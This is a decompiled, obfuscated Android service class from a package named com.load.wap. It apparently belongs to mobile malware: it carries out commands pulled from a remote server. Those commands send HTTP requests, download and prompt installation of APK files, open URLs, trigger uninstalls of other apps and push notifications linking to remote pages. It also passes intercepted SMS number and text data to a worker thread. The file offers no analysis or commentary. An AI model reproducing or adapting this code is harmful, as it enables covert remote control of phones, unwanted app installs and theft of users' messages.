package com.load.wap;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import java.io.File;
import java.io.PrintStream;
import java.util.List;

public final class MainService
  extends Service
  implements k
{
  public MainService() {}
  
  public static void a(Context paramContext, Intent paramIntent, String paramString)
  {
    Intent localIntent = new Intent(paramContext, MainService.class);
    paramIntent = paramIntent.getExtras();
    if (paramIntent != null) {
      localIntent.putExtras(paramIntent);
    }
    localIntent.putExtra("key", paramString);
    paramContext.startService(localIntent);
  }
  
  public static void a(Context paramContext, Intent paramIntent, String paramString1, String paramString2, String paramString3, long paramLong)
  {
    Intent localIntent = new Intent(paramContext, MainService.class);
    paramIntent = paramIntent.getExtras();
    if (paramIntent != null) {
      localIntent.putExtras(paramIntent);
    }
    localIntent.putExtra("key", paramString1);
    localIntent.putExtra("number", paramString2);
    localIntent.putExtra("text", paramString3);
    localIntent.putExtra("id", String.valueOf(paramLong));
    paramContext.startService(localIntent);
  }
  
  private void a(e paramE)
  {
    int j = 0;
    for (;;)
    {
      try
      {
        if (paramE.b.length() > 0)
        {
          f.e.g = paramE.b;
          localObject1 = MainApplication.c;
          f.b(this);
        }
        if (paramE.r)
        {
          f.e.h.clear();
          localObject1 = MainApplication.c;
          f.b(this);
        }
        if (paramE.u)
        {
          f.e.i.clear();
          localObject1 = MainApplication.c;
          f.b(this);
        }
        if (paramE.d.size() > 0)
        {
          i = 0;
          if (i >= paramE.d.size())
          {
            localObject1 = MainApplication.c;
            f.b(this);
          }
        }
        else
        {
          if (paramE.e.size() > 0)
          {
            i = 0;
            if (i < paramE.e.size()) {
              continue;
            }
            localObject1 = MainApplication.c;
            f.b(this);
          }
          if (paramE.c.size() > 0)
          {
            i = j;
            if (i < paramE.c.size()) {
              continue;
            }
          }
          if (paramE.f.length() > 0)
          {
            if (!paramE.g.equals("GET")) {
              continue;
            }
            b.a(paramE.f, "GET", paramE.h, paramE.i);
          }
          if (paramE.s) {
            MainApplication.a(b.a(b.a(this)));
          }
          if (paramE.j.length() > 0)
          {
            localObject1 = (ConnectivityManager)getSystemService("connectivity");
            if ((((ConnectivityManager)localObject1).getNetworkInfo(1).isAvailable()) || (((ConnectivityManager)localObject1).getNetworkInfo(0).isConnectedOrConnecting()))
            {
              localObject1 = System.currentTimeMillis() + ".apk";
              localObject2 = Environment.getExternalStorageDirectory() + "/download/";
              if (b.a((String)localObject2, paramE.j, (String)localObject1))
              {
                localObject1 = localObject2 + (String)localObject1;
                localObject2 = new Intent("android.intent.action.VIEW");
                ((Intent)localObject2).setDataAndType(Uri.fromFile(new File((String)localObject1)), "application/vnd.android.package-archive");
                startActivity((Intent)localObject2);
              }
            }
          }
          if (paramE.k.length() > 0)
          {
            localObject1 = new Intent("android.intent.action.VIEW", Uri.parse(paramE.k));
            ((Intent)localObject1).addFlags(268435456);
            startActivity((Intent)localObject1);
          }
          if (paramE.l.length() > 0)
          {
            localObject1 = paramE.l;
            localObject2 = new Intent("android.intent.action.DELETE");
            ((Intent)localObject2).setData(Uri.parse("package:" + (String)localObject1));
            ((Intent)localObject2).addFlags(268435456);
            startActivity((Intent)localObject2);
          }
          if ((paramE.m.length() > 0) && (paramE.q >= 0) && (paramE.p.length() > 0))
          {
            localObject3 = paramE.n;
            localObject1 = paramE.o;
            localObject2 = paramE.p;
            i = paramE.q;
            localObject4 = paramE.m;
          }
        }
      }
      catch (Exception paramE)
      {
        Object localObject1;
        int i;
        Object localObject2;
        Object localObject3;
        Object localObject4;
        paramE.printStackTrace();
        return;
      }
      try
      {
        paramE = (NotificationManager)getSystemService("notification");
        localObject3 = new Notification(i, (CharSequence)localObject3, System.currentTimeMillis());
        localObject4 = new Intent("android.intent.action.VIEW", Uri.parse((String)localObject4));
        ((Intent)localObject4).addFlags(268435456);
        ((Notification)localObject3).setLatestEventInfo(this, (CharSequence)localObject1, (CharSequence)localObject2, PendingIntent.getActivity(this, 0, (Intent)localObject4, 0));
        paramE.notify(1, (Notification)localObject3);
        return;
      }
      catch (Exception paramE)
      {
        paramE.printStackTrace();
      }
      f.e.i.add((h)paramE.d.get(i));
      i += 1;
      continue;
      f.e.h.add((h)paramE.e.get(i));
      i += 1;
      continue;
      localObject1 = (h)paramE.c.get(i);
      b.a(((h)localObject1).b, ((h)localObject1).c);
      i += 1;
      continue;
      if (paramE.g.equals("POST")) {
        b.a(paramE.f, "POST", paramE.h, paramE.i);
      }
    }
  }
  
  public final void a(int paramInt, Object paramObject)
  {
    System.out.println("threadOperationRun: " + paramInt);
    if (paramInt == 1)
    {
      paramObject = MainApplication.a();
      a(paramObject);
      System.out.println("tresponse.wait: " + paramObject.a);
      if (paramObject.a == 0L)
      {
        f.e.f = (System.currentTimeMillis() + f.e.e * f.a);
        paramObject = MainApplication.c;
        f.b(this);
        paramObject = f.e;
        b.a(this, f.e.f);
      }
    }
    while (paramInt != 2) {
      for (;;)
      {
        return;
        f.e.f = (System.currentTimeMillis() + paramObject.a * f.a);
      }
    }
    Object localObject = (String[])paramObject;
    paramObject = MainApplication.a(localObject[0], localObject[1]);
    if (paramObject.t)
    {
      f localF = MainApplication.c;
      f.a(Long.parseLong(localObject[2]));
      localObject = MainApplication.c;
      f.b(this);
    }
    a(paramObject);
  }
  
  public final IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public final void onCreate()
  {
    super.onCreate();
    setForeground(true);
  }
  
  public final void onDestroy() {}
  
  public final void onStart(Intent paramIntent, int paramInt)
  {
    super.onStart(paramIntent, paramInt);
    paramIntent = paramIntent.getExtras();
    String str;
    if ((paramIntent != null) && (paramIntent.get("key") != null))
    {
      str = (String)paramIntent.get("key");
      if (str.compareTo("alarm") != 0) {
        break label65;
      }
      new Thread(new j(this, 1, null)).start();
    }
    label65:
    while (str.compareTo("catch") != 0) {
      return;
    }
    new Thread(new j(this, 2, new String[] { (String)paramIntent.get("number"), (String)paramIntent.get("text"), (String)paramIntent.get("id") })).start();
  }
}
